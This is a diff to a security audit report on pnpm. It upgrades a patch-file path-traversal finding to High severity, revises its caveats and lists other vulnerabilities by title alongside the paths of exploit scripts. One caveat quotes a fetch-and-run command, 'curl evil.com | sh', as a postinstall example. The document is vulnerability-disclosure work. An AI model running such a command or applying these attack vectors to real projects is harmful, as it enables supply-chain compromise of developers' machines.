@@ -6,7 +6,7 @@
 **Repository:** `pnpm`
 **Commit Reviewed:** `976504f`
 **Date:** 2026-05-22
-**Status:** 1 High Vulnerability Confirmed + 3 End-to-End Exploit Chains
+**Status:** 2 High Vulnerabilities Confirmed + 3 End-to-End Exploit Chains
 
 ---
 
@@ -29,7 +29,7 @@ All findings in this report are classified into one of the following evidence ti
 | PNPM-001 | Integrity Check Bypass via Missing Lockfile Integrity Field | High | 7.5 | CWE-354 | Direct pnpm Exploit + Attacker Infrastructure |
 | PNPM-002 | Bin Linking Bypasses allowBuild Security Policy (PATH Hijacking) | Medium | 6.3 | CWE-269 | Direct pnpm Exploit + Attacker Infrastructure |
 | PNPM-003 | Auth Token Leakage on HTTP Redirect (Same Host) | Medium | 5.9 | CWE-522 | Direct pnpm Exploit + Attacker Infrastructure |
-| PNPM-004 | Arbitrary File Write/Delete via Malicious Patch File (Path Traversal) | Medium | 5.5 | CWE-22 | Direct pnpm Exploit |
+| PNPM-004 | Arbitrary File Write/Delete via Malicious Patch File (Path Traversal) | High | 7.1 | CWE-22 | Direct pnpm Exploit |
 | PNPM-005 | Git Fetch `--upload-pack` Argument Injection via `resolution.commit` | Medium | 5.5 | CWE-88 | Source-Confirmed / Partial Live |
 | PNPM-006 | Lockfile Resolution Path Traversal (Directory and Tarball Fetchers) | Medium | 4.5 | CWE-22 | Direct pnpm Exploit + Attacker Infrastructure |
 | PNPM-007 | Git ext:: Protocol Injection via Lockfile (Conditional RCE) | Low | 3.1 | CWE-20 | Source-Confirmed / Partial Live |
@@ -103,7 +103,7 @@ CHAIN-2 PASS -- SSH authorized_keys replaced with attacker public key via patch 
 
 #### Component Vulnerabilities
 
-- **PNPM-004** (Medium, 5.5): Both the file deletion (`fs.unlinkSync`) and file creation (`fs.writeFileSync`) effects use unsanitized paths from patch `diff --git` headers, enabling arbitrary file write and delete via path traversal.
+- **PNPM-004** (High, 7.1): Both the file deletion (`fs.unlinkSync`) and file creation (`fs.writeFileSync`) effects use unsanitized paths from patch `diff --git` headers, enabling arbitrary file write and delete via path traversal.
 
 #### Combined Impact
 
@@ -396,7 +396,7 @@ This ensures that any protocol change (HTTPS to HTTP) strips the auth header, ev
 
 ### PNPM-004: Arbitrary File Write/Delete via Malicious Patch File (Path Traversal)
 
-**Severity:** Medium -- 5.5 (AV:N/AC:L/PR:H/UI:R/S:U/C:N/I:H/A:L)
+**Severity:** High -- 7.1 (AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:H/A:H)
 **CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
 **Proof of Concept (write):** `exploits/vuln6_patch_traversal_write/exploit.sh`
 **Proof of Concept (delete):** `exploits/vuln7_patch_traversal_delete/exploit.sh`
@@ -484,8 +484,8 @@ Arbitrary file write and delete as the user running `pnpm install`. An attacker 
 
 #### Caveats
 
-- **Requires repository commit access.** The attacker must be able to commit both a `.patch` file and a `pnpm-workspace.yaml` modification to the project. An attacker with this level of access can often cause equivalent damage through other means -- for example, committing a malicious postinstall script directly. The path traversal is an incremental defense-in-depth gap rather than a unique attack vector.
-- **Patch files are human-readable.** A careful code reviewer examining the `.patch` file would see the `../` sequences in the diff headers. However, patch files are not commonly subject to detailed security review.
+- **Requires a merged PR, not direct commit access.** The attacker submits a PR adding a `.patch` file and a `pnpm-workspace.yaml` modification. A maintainer must merge it. This is PR:L (any contributor), not PR:H (admin). While a PR with a malicious `postinstall` script in `package.json` could achieve similar outcomes, patch files receive far less review scrutiny — the `../` traversal sequences are buried in `diff --git` headers that look like normal patch metadata, unlike a clearly suspicious `"postinstall": "curl evil.com | sh"`.
+- **Patch files are opaque to most reviewers.** Unified diff format is dense and tooling-focused. Code review UIs typically don't highlight path traversal in diff headers. The `../` sequences blend into what looks like standard patch formatting, making this vector harder to catch in review than equivalent attacks via `package.json` scripts.
 - **npm and yarn do not have a built-in patch mechanism.** The `patch-package` npm module (the upstream of pnpm's vendored fork) has the same vulnerability. This is shared with the `patch-package` ecosystem rather than unique to pnpm.
 
 #### Remediation
@@ -795,7 +795,8 @@ autofyn_audit/
 ├── teardown.sh
 ├── run_all_exploits.sh
 ├── docs/
-│   └── CVE-PNPM-001.md
+│   ├── CVE-PNPM-001.md
+│   └── CVE-PNPM-004.md
 └── exploits/
     ├── vuln1_integrity_bypass/
     ├── vuln2_auth_downgrade/
